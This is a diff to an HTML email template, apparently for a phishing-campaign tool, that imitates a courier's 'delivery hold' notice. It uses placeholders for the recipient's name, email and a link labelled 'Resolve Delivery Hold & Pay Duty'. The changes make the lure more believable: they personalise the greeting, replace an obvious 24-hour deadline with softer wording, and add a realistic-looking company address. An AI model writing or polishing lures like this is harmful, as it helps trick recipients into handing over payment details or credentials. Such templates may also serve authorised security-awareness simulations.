@@ -137,11 +137,15 @@
             <table class="tracking-table">
                 <tr>
                     <th>Tracking ID</th>
-                    <td>GE-8492041-XM</td>
+                    <td>GEC-8492041-XM</td>
+                </tr>
+                <tr>
+                    <th>Recipient</th>
+                    <td>{{.FirstName}} {{.LastName}}</td>
                 </tr>
                 <tr>
                     <th>Estimated Delivery</th>
-                    <td>Pending Verification</td>
+                    <td>Pending address confirmation</td>
                 </tr>
                 <tr>
                     <th>Parcel Contents</th>
@@ -157,20 +161,21 @@
                 </tr>
             </table>
 
-            <p>To ensure your package is delivered in time for the holidays, you must verify your shipping address and process the payment within 24 hours.</p>
+            <p>To release your package for delivery, please confirm your shipping address and settle the outstanding customs duty within 3 business days.</p>
 
             <div class="cta-container">
                 <a href="{{.URL}}" class="cta-button">Resolve Delivery Hold &amp; Pay Duty</a>
             </div>
 
-            <p>Failure to update details or settle the customs balance will result in the package being returned to the sender after 3 business days.</p>
+            <p>If the address is not confirmed and the customs balance remains unpaid after 3 business days, the package will be returned to the sender.</p>
 
             <p>Sincerely,<br>
             <strong>Global Express Logistics Support</strong></p>
         </div>
 
         <div class="footer">
-            <p>This automated shipment tracking message was dispatched to {{.Email}}. Please do not reply directly to this message.</p>
+            <p>Global Express Courier Network &mdash; Customer Service Center, 240 Cargo Way, Newark, NJ 07114</p>
+            <p style="margin-top: 10px;">This automated shipment tracking message was dispatched to {{.Email}}. Please do not reply directly to this message.</p>
             <p style="margin-top: 10px;">© 2026 Global Express Courier Network. All rights reserved.</p>
         </div>
     </div>
